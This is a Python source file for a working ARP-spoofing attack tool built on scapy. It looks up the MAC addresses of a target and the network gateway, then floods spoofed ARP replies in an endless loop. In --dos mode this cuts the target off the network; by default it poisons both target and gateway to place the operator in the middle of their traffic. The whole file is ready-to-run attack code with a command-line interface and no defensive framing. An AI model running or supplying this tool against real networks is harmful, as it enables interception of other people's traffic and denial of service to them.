from scapy.all import ARP, Ether, ICMP, IP, sendp, sniff, sr1, srp1
import argparse

"""
	This function is responsible for getting the MAC address of the IP address
	provided.
"""
def get_mac(ip):
	arp = Ether()/ARP(pdst=ip)
	resp = srp1(arp)

	return (resp[Ether].src)


"""
	This function is responsible for getting the IP address of the network's
	default gateway.
"""
def get_default_gateway_ip():
	p = sr1(IP(dst="www.google.com", ttl = 0)/ICMP()/"XXXXXXXXXXX")

	return (p.src)


"""
	This function is responsible for sending spoofed ARP responses to the target
	IP address.
"""
def poison_arp_cache(target_ip, target_mac_addr, spoofed_ip, spoofed_mac_addr=Ether().src):
	# Create the ARP response
	spoofed_resp = Ether()/ARP()

	# Set the destination MAC address
	spoofed_resp[Ether].dst = target_mac_addr
	spoofed_resp[ARP].hwdst = target_mac_addr

	# Set the destination IP address
	spoofed_resp[ARP].pdst = target_ip

	# Set the spoofed MAC address
	spoofed_resp[Ether].src = spoofed_mac_addr
	spoofed_resp[ARP].hwsrc = spoofed_mac_addr

	# Set the spoofed IP address
	spoofed_resp[ARP].psrc = spoofed_ip

	# is-at (response)
	spoofed_resp[ARP].op = 2

	#print(spoofed_resp[0].show())
	sendp(spoofed_resp)


"""
	This function is responsible for poisoning the ARP cache of the target with a false
	MAC address to DOS the target.

	Note: Seems to work only on ethernet networks as in WiFi, the AP drops the
	packet if the spoofed MAC address is not in its association list.
"""
def perform_dos(target_ip):
	# Get default gateway's network details
	default_gateway_ip = get_default_gateway_ip()

	# Get the MAC address of the target
	target_mac_addr = get_mac(target_ip)

	# Keep sending spoofed ARP responses
	while True:
		poison_arp_cache(target_ip, target_mac_addr, default_gateway_ip, "ab:cd:ef:ab:cd:ef")


"""
	This function is responsible for poisoning the ARP cache of both the target
	and the default gateway to become the middle man.
"""
def perform_mitm(target_ip):
	# Get default gateway's network details
	default_gateway_ip = get_default_gateway_ip()
	default_gateway_mac = get_mac(default_gateway_ip)

	# Get target's MAC address
	target_mac = get_mac(target_ip)

	# Keep sending spoofed ARP responses
	while True:
		# Poison target's ARP cache table
		poison_arp_cache(target_ip, target_mac, default_gateway_ip)
		print(f"Sent ARP reply to {target_ip}")

		# Poison default gateway's ARP cache table
		poison_arp_cache(default_gateway_ip, default_gateway_mac, target_ip)
		print(f"Sent ARP reply to {default_gateway_ip}")


def main():
	parser = argparse.ArgumentParser()

	parser.add_argument("target", help="Target's IP address", action="store")
	parser.add_argument("--dos", help="Perform a DOS on target", action="store_true")

	args = parser.parse_args()
	print(f"Target IP: {args.target}")

	if (args.dos):
		perform_dos(args.target)
	else:
		perform_mitm(args.target)


if __name__ == "__main__":
	main()